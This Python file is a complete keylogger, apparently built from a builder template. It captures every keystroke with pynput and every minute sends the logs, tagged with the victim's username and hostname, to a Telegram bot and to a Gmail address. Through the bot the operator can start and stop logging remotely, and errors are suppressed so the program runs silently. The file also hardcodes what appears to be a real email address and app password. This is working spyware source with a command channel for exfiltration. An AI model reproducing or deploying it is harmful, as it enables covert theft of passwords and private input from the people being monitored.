import os
import platform
import socket
import threading
import smtplib
import json
import sys
import time
from email.mime.text import MIMEText
import telebot # pip install pyTelegramBotAPI
from pynput import keyboard # pip install pynput

# ================= USER CONFIGURATION (HARDCODED) ===================
# ================= USER CONFIGURATION ===================
BOT_TOKEN = "TOKEN_PLACEHOLDER"  # AUTOMATICALLY REPLACED BY BUILDER
EMAIL_ADDRESS = "prakashwijesinghanew@gmail.com"
EMAIL_PASSWORD = "fner adgz ooqy jmps"
TO_EMAIL = "prakashwijesinghanew@gmail.com"
SEND_INTERVAL = 60
CONFIG_FILE = "log_config.json"
# ===================================================================

def get_config():
    """Load config or auto-discover Chat ID silently."""
    config = {
        "bot_token": BOT_TOKEN,
        "chat_id": ""
    }
    
    # Try to load existing chat_id
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                saved_config = json.load(f)
                if saved_config.get("chat_id"):
                    config["chat_id"] = saved_config["chat_id"]
        except Exception:
            pass
    
    # If Chat ID is missing, entering Silent Discovery Mode
    if not config["chat_id"]:
        try:
            temp_bot = telebot.TeleBot(config["bot_token"])
            
            # Polling loop to capture first message
            while True:
                try:
                    updates = temp_bot.get_updates(offset=-1)
                    if updates:
                        last_update = updates[-1]
                        chat_id = last_update.message.chat.id
                        config["chat_id"] = str(chat_id)
                        save_config(config)
                        
                        # Notify Admin of connection
                        try:
                            temp_bot.send_message(chat_id, f"✅ **Connection Established!**\nHostname: `{socket.gethostname()}`", parse_mode="Markdown")
                        except: 
                            pass
                        break
                except Exception:
                    pass
                time.sleep(2) # Retry every 2 seconds
                
        except Exception:
            pass # Silent fail if token is wrong, keep retry logic if needed or exit

    return config

def save_config(config):
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=4)
    except Exception:
        pass

class KeyloggerBot:
    def __init__(self, config):
        self.interval = SEND_INTERVAL
        self.token = config["bot_token"]
        self.chat_id = config["chat_id"]
        
        self.email = EMAIL_ADDRESS
        self.password = EMAIL_PASSWORD
        self.to_email = TO_EMAIL
        
        self.log = ""
        self.username = os.getlogin()
        self.hostname = socket.gethostname()
        
        self.is_logging = True
        self.email_enabled = True 
        
        try:
            self.bot = telebot.TeleBot(self.token)
            self.setup_bot_handlers()
        except Exception:
            pass

    def setup_bot_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            self.is_logging = True
            self.bot.reply_to(message, "✅ **Logging Started!**")

        @self.bot.message_handler(commands=['stop'])
        def handle_stop(message):
            self.is_logging = False
            self.bot.reply_to(message, "🛑 **Logging Stopped!** (Bot is active)")

        @self.bot.message_handler(commands=['email_on'])
        def handle_email_on(message):
            self.email_enabled = True
            self.bot.reply_to(message, "📧 **Email Logs: ENABLED**")

        @self.bot.message_handler(commands=['email_off'])
        def handle_email_off(message):
            self.email_enabled = False
            self.bot.reply_to(message, "📴 **Email Logs: DISABLED**")

        @self.bot.message_handler(commands=['logs'])
        def handle_logs(message):
            if self.log:
                self.send_data(force=True)
            else:
                self.bot.reply_to(message, "📭 Log is empty.")

        @self.bot.message_handler(commands=['help'])
        def handle_help(message):
            status_msg = (
                f"🤖 **Bot Status**\n"
                f"Logging: {'✅ ON' if self.is_logging else '🛑 OFF'}\n"
                f"Email: {'✅ ON' if self.email_enabled else '📴 OFF'}\n\n"
                f"**Commands:**\n"
                f"/start, /stop, /logs, /email_on, /email_off"
            )
            self.bot.reply_to(message, status_msg, parse_mode="Markdown")

    def append_to_log(self, string):
        self.log += string

    def on_press(self, key):
        if not self.is_logging:
            return

        try:
            current_key = str(key).replace("'", "")
        except ImportError:
            pass

        if key == keyboard.Key.space:
            current_key = " "
        elif key == keyboard.Key.enter:
            current_key = "\n"
        elif key == keyboard.Key.esc:
            pass
        elif key == keyboard.Key.backspace:
            current_key = " [BACKSPACE] " 
        elif str(key).find("Key") != -1:
            current_key = f" [{str(key).split('.')[1]}] "

        self.append_to_log(current_key)

    def send_email(self, message):
        if not self.email_enabled or not self.email or not self.password:
            return
            
        try:
            msg = MIMEText(message)
            msg['Subject'] = f"Keylogs - {self.username}@{self.hostname}"
            msg['From'] = self.email
            msg['To'] = self.to_email

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(self.email, self.password)
                server.send_message(msg)
        except Exception:
            pass

    def send_data(self, force=False):
        if self.log:
            header = f"🔐 **Keylogs from:** `{self.username}@{self.hostname}`\n\n"
            full_message = header + self.log
            
            # Send to Telegram
            try:
                self.bot.send_message(self.chat_id, full_message, parse_mode="Markdown")
            except Exception:
                pass

            # Send to Email (if enabled)
            if self.email_enabled:
                self.send_email(self.log)

            self.log = "" # Clear after sending

        # Restart timer if not forced
        if not force:
            timer = threading.Timer(self.interval, self.send_data)
            timer.daemon = True
            timer.start()

    def start(self):
        # Notify start
        try:
            self.bot.send_message(self.chat_id, f"🚀 **Keylogger Started!**\nTarget: `{self.username}@{self.hostname}`", parse_mode="Markdown")
        except Exception:
             pass

        # Start Reporting Timer
        self.send_data()

        # Start Key Listener (Non-blocking)
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        # Start Bot Polling (Blocking)
        try:
            self.bot.infinity_polling()
        except Exception:
            pass

if __name__ == "__main__":
    # 1. Load Config (Auto-Silent)
    config = get_config()
    
    # 2. Start Keylogger
    if config.get("chat_id"):
        keylogger = KeyloggerBot(config)
        keylogger.start()
